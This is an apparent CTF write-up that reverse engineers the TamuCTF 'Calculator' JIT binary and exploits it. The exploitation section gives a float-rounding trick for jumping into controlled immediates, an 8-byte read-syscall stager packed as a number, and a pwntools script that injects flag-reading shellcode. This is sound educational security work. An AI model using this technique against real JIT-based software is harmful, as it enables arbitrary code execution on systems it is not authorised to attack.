[TamuCTF](https://tamuctf.com) Started last thursday, and took place over 3 days, ending on the 25th (Sunday). The CTF had many different categories, however since I only know (a little bit) pwn I found myself focusing on exclusively those challenges. Of those I managed to solve 8 out of the 11 available. One of these challenges was called **Calculator**.
## What is it?
When doing CTF challenges/Attacking real targets, people generally say the first step you need to take is to understand the general functionality of the program, then you can understand where vulnerabilities *could* be found, so lets take a look:

![1](https://user-images.githubusercontent.com/73792438/116205887-1c4fda80-a736-11eb-8607-d8e346699349.PNG)

Looks like a calculator (duhh) but with the added feature that instead of just giving numbers and symbols (say "1+1") then evaluating them, we use assembly-like syntax to specify the operation we want. Its sort of unfair to start this way, as I already knew that specifying 'add' would yeald results, so i'll tell you that i spent ~10mins just messing around with the binary without delving too deep, so thats why I know. 

The program has another option we didn't use, being "Print Instructions". Take a look:

![2](https://user-images.githubusercontent.com/73792438/116206992-4e157100-a737-11eb-9cb3-f057169ad64a.PNG)

So that just prints what we entered, cool. I think now we have a general idea of what the program does, and how to use it:

 - "Add instruction" adds an instruction to a buffer/list of commands, this can then be retrieved by "Print Instructions" for printing.
 - "Print Instructions" lists out the commands/instructions we added through "Add instruction".
 - "Evaluate" does some magic and eventually spits out the result of our sum.

Another thing we can do is try and enter some garbled mess into "Add Instruction" and see what happens:

![3](https://user-images.githubusercontent.com/73792438/116208160-84072500-a738-11eb-9910-357ed32e50c2.PNG)

As you can see, the program has to do some parsing of our input in "Evaluate", and obviously doesn't even try to interpret our string of 'A's.
Now we can get into the nitty gritty in ghidra to understand the *how* and *why* of this program.

## How?

Starting in main, we see that the decompilation of this function looks very clean, so there is no need to look at ASM for the time being (phew):
(Note that I have added annotations to some of the source code in the other functions and renamed others, so the decompilation will be different on your side)

![4](https://user-images.githubusercontent.com/73792438/116210149-84a0bb00-a73a-11eb-8e6d-8781f75f9cb4.PNG)

As you can see upon starting main we disable buffering for stdout with `setvbuf()`. This means we should get output from the program only when it sends it, and no-where
else. This makes it easier to recieve data when we program our exploit script later. We then `malloc()` some memory with the size of `(instruction_count + 1) << 3` (an easier way to understand this is as `(instruction_count + 1) * 8`) and store a pointer to that memory in `instructions`. 

We can already (correctly) speculate as to the purpose of these variables; the `instructions` variable holds a pointer to heap memory where our entered instructions are stored in some way, and `instruction_count` stores the number of instructions/commands entered, nice.

We then enter a command loop with `do {} while(True)` that will keep looping until we Ctrl+C/Kill the program another way, and contained inside this loop is code for our 3 choices. We can see some already recognisable functions names `add_instruction()` and `print_instruction()` which both do as you would expect. But then we see what happens for the 3rd choice, or "Evaluate":

![5](https://user-images.githubusercontent.com/73792438/116214516-aef47780-a73e-11eb-915f-9fbecdedc74d.PNG)

'Jit' stands for 'Just in Time', and generally refers to a type of compilation. This would hint that maybe our simple calculator program is something a little more than
what it seems...

You may wonder why I have named the two variables 'choice' and 'decision' as such, when they are practically the same thing. This is because I lack creativity and couldn't come up with any better names.

Anyway, we should start from the top. We can tackle the beast that is the `jit()` function once we understand how the others work, starting with `add_instruction()`.

### add_instruction()

Again (thanks ghidra) the decompilation is very clean, so we can simply use it again. Before we do this I feel that its important to mention you shouldn't always trust a decompiler to tell you the truth of things, I just found that it was perfect for this challenge, but don't make it a habit. Anyway:

![6](https://user-images.githubusercontent.com/73792438/116218998-05fc4b80-a743-11eb-8403-041e05a9e0d2.PNG)

Here's where my nonsensical annotations begin, and never stop lul. Firstly, the function allocates `0x1e` (30) bytes of space, initialises it with zeros using `memset()` and then reads into this memory from `stdin`. So any given command can be a max of `0x1e` bytes long, cool. 

We then store a pointer to our input in the area allocated for holding `instructions` (recall that the area allocated is `(instruction_count + 1) * 8` big). This is actually where `print_instruction()` will look when trying to print out our instructions, so this snippet just stores a pointer to be dereferenced and printed later, but we will get there when we get there. 

The program then sets `instruction_mem_size = instruction_count + 2` and increments `instruction_count`. The latter makes sense; of course whenever `add_instruction()` is called we expect to add another instruction, but what is the purpose of `instruction_mem_size` being incremented? Well if we look a little further on we can see it being used to malloc some space: `__dest = malloc((long)instruction_mem_size << 3);` and then into said space is copied the contents of the `instructions` heap memory. Since we increment it by 2, rather than just 1, this gives us an extra "1\*8" in space. This space is then used to store the pointer to our input that is used by `print_instruction()`.

Now the program `free()`s the `instructions` memory, and sets it to the new pointer to memory we just allocated, `__dest`. 

So, to recap. Whenever we call `add_instruction()` we read an instruction/whatever happens to be sent via stdin into a heap buffer. A pointer to this buffer is then written
into the `instructions` heap memory, along with any other instruction buffers that may already be there. We than allocate another heap buffer that is equal to the size of the previous buffer + 8. Then we free the old heap buffer, and set `instructions` to the new memory. Here's what that would look like in gdb:

![7](https://user-images.githubusercontent.com/73792438/116226666-2d571680-a74b-11eb-89f4-70edbf73364d.PNG)

With the address `0x5555555592a0` being the `__dest` pointer.

### print_instruction()

Now we can have a breather, as this function should already be pretty farmiliar to you, its also quite simple:

![8](https://user-images.githubusercontent.com/73792438/116227135-b40bf380-a74b-11eb-89dc-1369bddf80f3.PNG)

All it does is iterate through the `instructions` heap memory, dereferencing any pointers it may find and printing them. As I point out at the top, this will also print out any garbage we add to our instructions buffer, but this is mainly due to `add_instruction()` not doing any checks on whether our input is a valid instruction/command. This isn't particularly important, just I would mention it.

## jit()

One of the hallmarks of a JIT compiler is that some language (such as python or javascript) is converted into Byte-code, and then that bytecode is then fed into an interpreter such as the python interpreter that then converts that bytecode into machine code and executes it. This program does implement JIT, although it takes out the bytecode and instead just converts our commands into machine code, lets take a look: 
(The function is too big for a screenshot so I will paste the decompiled code here)

```c

void jit(void)

{
  int choice_1;
  ulonglong arg1;
  double skipped_instructions_float;
  char *nullptr;
  char skipped_instructions [8];
  undefined8 executed_code;
  char *instr_name;
  int size_of_code;
  int real_skipped_instructions;
  int iter;
  undefined *code_ptr;
  
  puts("How many instructions would you like to skip?");
  fgets(skipped_instructions,8,stdin);
                    /* converts string input from fgets() into an actual number so it can be used to
                       skip some instructions. Interestingly enough this is a float. Hmmmm.... */
  skipped_instructions_float = atof(skipped_instructions);
                    /* each encoding of instructions = 13 bytes */
  real_skipped_instructions = (int)(skipped_instructions_float * 13.0);
  size_of_code = instruction_count * 0xd + 4;
                    /* map some memory and store a pointer to the mapped area in 'code_ptr' */
  code_ptr = (undefined *)mmap(&Elf64_Ehdr_00100000,(long)size_of_code,0,0x22,-1,0);
                    /* make new code area rwx (juicy) */
  mprotect(code_ptr,(long)size_of_code,7);
                    /* add instructions at the end of our allocated code that disassemble to:
                       48 89 C8    mov rax, rcx
                       C3          ret
                       This is the code that supplies the return value that we check at the end, and
                       returns execution back to jit() (return value goes in rax) */
  code_ptr[(long)size_of_code + -4] = 0x48;
  code_ptr[(long)size_of_code + -3] = 0x89;
  code_ptr[(long)size_of_code + -2] = 200;
  code_ptr[(long)size_of_code + -1] = 0xc3;
                    /* iterate through all charps in instructions */
  iter = 0;
  while (iter < instruction_count) {
    instr_name = *(char **)(instructions + (long)iter * 8);
                    /* 48 B8 00 00 00 00 00 00 00 FF    movabs rax, 0xff00000000000000 */
    *code_ptr = 0x48;
    code_ptr[1] = 0xb8;
                    /* extract our number we specified with the instruction. E.g, if we said "add
                       123"
                       this would extract "123" and convert it to unsigned long long */
    arg1 = strtoull(instr_name + 4,&nullptr,10);
                    /* set arg1 to the operand of the movabs rax instruction  */
    *(ulonglong *)(code_ptr + 2) = arg1;
    code_ptr[10] = 0x48;
    code_ptr[0xc] = 0xc1;
    code_ptr = code_ptr + 10;
    choice_1 = strncmp(instr_name,"add",3);
                    /* if "add" str is found, encode an add instruction */
    if (choice_1 == 0) {
                    /* 48 01 C1    add rcx, rax */
      code_ptr[1] = 1;
    }
    else {
      choice_1 = strncmp(instr_name,"sub",3);
                    /* if "sub" str is found, encode a sub instruction */
      if (choice_1 == 0) {
                    /* 48 29 C1    sub rcx, rax */
        code_ptr[1] = 0x29;
      }
      else {
        choice_1 = strncmp(instr_name,"xor",3);
                    /* if "xor" str is found, encode an xor instruction */
        if (choice_1 == 0) {
                    /* 48 31 C1    xor rcx, rax */
          code_ptr[1] = 0x31;
        }
      }
    }
                    /* move onto encoding the next instruction */
    code_ptr = code_ptr + 3;
    iter = iter + 1;
  }
                    /* execute jit()ted code, and store the return value (whatevery happened to be
                       in rax when the function exited) in 'executed code' */
  executed_code = (*(code *)(long)(real_skipped_instructions + 0x100000))();
                    /* get return value from executed code */
  printf("result = %llu\n",executed_code);
  munmap(&Elf64_Ehdr_00100000,(long)size_of_code);
  return;
}

```

So... Where to start? Well first we are prompted to enter "How many instructions would you like to skip?". Our input is then converted to a float (keep note of this, as it will be extremely important later on) and stored, and then multiplied by 13. Now the program calculates how long our code will need to be with `size_of_code = instruction_count * 0xd + 4;` we then call `mmap()` with this value as the length argument and attempt to map that amount of memory from the address `0x100000` (this is static, and never changes). When that the memory is mapped we call `mprotect()` and set it to be readable, writable, and executable. 

Another common characteristic of JIT is that it will set the permissions on memory pages to be readable, writable, and executable and never change them back. This is because it will take the byte-code, convert it into machine code, write it to memory and execute it all together. Calling a syscall like `mprotect()` to periodically to reset permissions on the memory ranges when they don't need to be, for instance writable, but only executable would take time, so often JIT pages will be all 3 at once. This is also the case for this program as it writes code into this memory, then executes it all in one.

Then we do something odd:

![9](https://user-images.githubusercontent.com/73792438/116240964-592ec800-a75c-11eb-9ecd-935b2ebf6350.PNG)

Here you can see that we modify the memory at the end of our mapped space at indexes `code_ptr[size_of_code - 1]` to `code_ptr[size_of_code - 4]` and each time we write
a byte. This is the first time we write code into the new memory, even though these bytes just look like data the comment explains that these actually disassemble onto `mov rax, rcx ; ret`. These are placed at the end of our code, meaning these will be executed after all our other stuff is done with. This specific `ret` instruction is responsible for returning back into `jit()` once we have finished execution. If you were wondering why `size_of_code = instruction_count * 0xd + 4;` rather than `size_of_code = instruction_count * 0xd;`, its because these instructions make up for those last 4 bytes.

Next we enter a loop that iterates through `instruction_count`, meaning for every instruction this loop will execute. In this loop is where the magic of "Evaluate" happens.

![10](https://user-images.githubusercontent.com/73792438/116242813-356c8180-a75e-11eb-8dca-d022b068f700.PNG)

Firstly, we get one of the charps from our `instructions` variable (recall that all `instructions` really is just a list of charps) and store it in `instr_name`. Next we write part of another instruction to our memory, this time being a `movabs rax, ?` instruction, we then parse the string at `instr_name` and take out the argument we supply to our command. Then convert it to an `unsigned long long` using `strtoull()`. We then write this new number into the `movabs rax, ?` instruction as its argument. `unsigned long long` is 8 bytes of 64 bits long, meaning that the argument for `movabs rax, ?` will be either padded out to 8 bytes or take all the 8 bytes of the number we supply.

This means that we completely control the operand, all 8 bytes of it. Here's what that looks like in gdb:

![12](https://user-images.githubusercontent.com/73792438/116245484-e7a54880-a760-11eb-9c5d-dbff4d67f247.PNG)

When we then call the code in `jit`:

![13](https://user-images.githubusercontent.com/73792438/116245492-ea07a280-a760-11eb-9373-21546a12151b.PNG)

This is another thing that will be very relevent soon.

In the screenshot above, you can also see that our "add" command was encoded as an actual `add` instruction, now were going to see how:

![14](https://user-images.githubusercontent.com/73792438/116246165-a3667800-a761-11eb-8566-1c1e04d0930e.PNG)

10 bytes later in the code (`code_ptr[10]`) after we have finished encoding the `movabs rax, ?` instruction, we see some more bytes that could be instructions being written, 
one at `code_ptr[10]` and one at `code_ptr[0xc]` (12). The code_ptr is then incremented by 10, so that it points where `code_ptr[10]` used to point. And a different byte is written to `code_ptr[1]` (`code_ptr[11]`) depending on what operation we specified in our input string. In the case of our previous screenshot, "add" was used and so '1' is written in between `code_ptr[10]` (0x48) and `code_ptr[12]` (0xc1), making the bytes equal to `\x48\x01\xc1`, creating an `add rcx, rax` instruction:

![15](https://user-images.githubusercontent.com/73792438/116247855-2b994d00-a763-11eb-9d60-5b88288748c4.PNG)

The same thing happens for the other instruction/commands "xor" and "sub". I never needed to touch these though. We now finally come to the end of the `jit()` function:

![16](https://user-images.githubusercontent.com/73792438/116248153-7d41d780-a763-11eb-837c-7f4da5230367.PNG)

`code_ptr` now points to the byte in between `\x48` and `\xc1`. So the program needs to increment the pointer by '3' if it wants the next iteration of the loop to start writing instructions into memory that is unused, so it does just that. `iter` is then incremented by one. This loop will continue as long as `iter < instruction_count`, so every command will have the operations above conducted on them. When all commands have been processed, its time to exit the loop.

Now that all the commands have been interpreted and translated into machine code, and all boilerplate instructions have been written into the memory we can finally call/run the code. First we add the number of instructions * 13.0 that we want to skip. Why times 13? Well each command is translated into 13 bytes of x86, as you have observed. So it would make sense to add 13 if you wanted to start at the next instruction, but after we have done this calculation the code is run and thanks to the `ret` instruction hardcoded at the end can return back into `jit()`. The return value being placed in `rax` beforehand. This value actually contains the result of all our commands/operations, and is then printed by `printf()`. The program then returns into `main()` and the cycle continues indefinitely.

## Exploitation

I tried to put specific emphasis on a couple of things when describing how `jit()` worked, namely that we can control all the bytes in the `movabs rax, ?` instruction operand, and that the equation to skip instructions uses a `float` value. The main thing to understand is the float value. Let me demonstrate:

![17](https://user-images.githubusercontent.com/73792438/116250955-1bcf3800-a766-11eb-9676-8f299dd7ba12.PNG)

Here i make 4 "add" instructions. Now i'm going to "Evaluate" and choose to skip 4 instructions. This should result in skipping all of my commands:

![18](https://user-images.githubusercontent.com/73792438/116251417-8bddbe00-a766-11eb-9d2b-48850f639e65.PNG)

As you can see, this is exactly what happened. We end up at the `mov rax, rcx ; ret` instruction at the end of the code. We skip a total of 0x34 bytes, or 13 * 4 bytes. Now i will enter the same instructions again, this time choosing to skip '1.2' instructions. Watch what happens next:

![19](https://user-images.githubusercontent.com/73792438/116252072-250cd480-a767-11eb-9aed-9a37ac74997c.PNG)

The first thing before I show you were EXACTLY we return, is looking at the address. It should be a multiple of 13, right? No, since we were allowed to enter a float value, we can choose any value we wish. Take 1.2 for example. '1\*13 = 13' this is okay, but: '1.2\*13 = 15.6', 15.6 is then rounded to 16 up when the `real_skipped_instructions` value is typecasted into an integer here: `real_skipped_instructions = (int)(skipped_instructions_float * 13.0);`. And 16 = 0xf. Now we will see what we return into:

![20](https://user-images.githubusercontent.com/73792438/116252921-ecb9c600-a767-11eb-9a5c-5a5cafe7f1fd.PNG)

If you recall, the number we specified as our "add" command argument was 10416984888683040912, and this in hex is 0x9090909090909090. I'm sure you know where this is going lul. So we can completely control the operands, and can jump into said operand through manipulating the `real_skipped_instructions` variable. But we only have 8 bytes :(. 
What on earth can we do with 8 bytes? Everything.

Remember back when we `mprotect()`ed the memory to be rwx? That means its writable aaaand we have code execution. Could we call `read()` with the buffer/rsi as a value in this memory? Looking at the register layout at the time of jumping into the code, and we can see that:

![21](https://user-images.githubusercontent.com/73792438/116254263-1b846c00-a769-11eb-9e16-065df2801ae8.PNG)

This could certainly work (maybe). Using [This](https://syscalls.w3challs.com/?arch=x86_64) we can figure out that in order to call read(), we need a couple things:
 - **RAX** = 0 (read syscall number)
 - **RDI** = 0 (stdin, or any other fd we can control)
 - **RSI** = a value in our rwx memory that we can execute code at
 - **RDX** = a valid size

Looking at the register state we see that:
 - **RAX** = already 0
 - **RDI** = needs changing to 0
 - **RSI** = Nope
 - **RDX** = is a valid size, but needs to be in RSI

So we need a snippet of asm that can clear rdi, swap rsi and rdi, and `syscall` that 8 bytes or less. I came up with the following, and packed it as a number:

```asm
  xor rdi, rdi
  xchg rsi, rdx
  syscall
```
`\x48\x31\xff\x48\x87\xd6\x0f\x05` == 364776757699490120

This should be able to call `read()` with an unlimited size to write/read in data from stdin, we can test this:

![22](https://user-images.githubusercontent.com/73792438/116256218-e547ec00-a76a-11eb-890e-ae18eb8ad950.PNG)
![23](https://user-images.githubusercontent.com/73792438/116256349-04df1480-a76b-11eb-8287-02c43223f9d2.PNG)
![24](https://user-images.githubusercontent.com/73792438/116256480-2213e300-a76b-11eb-9071-d7df0329b441.PNG)

So it certainly looks like `read()` worked. Now what if we were able to write some code here that actually did something?
Heres my exploit script:

```python
from pwn import *
import sys

# add 364776757699490120

# Load shellcode - just reads 'flag.txt' then sends it to stdout
f = open("catflag", "rb")
flag_pls = f.read()
f.close()

p = process(sys.argv[1])
#p = remote('127.0.0.1', 4444)

# Attach with gdb
gdb.attach(p, '''
    break *jit+542
    continue
        ''')

# Add 6 instructions
for i in range(0, 6):
    print(p.recvuntil("Action: "))
    p.sendline("1")
    p.clean()
    p.sendline("add 364776757699490120")


# Evaluate/ call jit()
print(p.recvuntil("Action: "))
p.sendline("3")

p.recvuntil("How many instructions would you like to skip?")
p.sendline("1.2")

# We have (hopefully) hijacked control flow now into our shellcode.

p.clean()
# Send our shellcode to read()
p.sendline(b"\x90"*0x100 + flag_pls)

# Recieve the flag
print(p.recvall())
p.close()
```

Here's it working locally:
![25](https://user-images.githubusercontent.com/73792438/116258501-eb3ecc80-a76c-11eb-904f-33bea49bebc4.PNG)

And on the challenge server:

![26](https://user-images.githubusercontent.com/73792438/116258994-54bedb00-a76d-11eb-9343-b56d3b2addd0.PNG)

I don't know why i bothered censoring the flag when I just gave you the exploit, but oh well. 

Happy pwning!
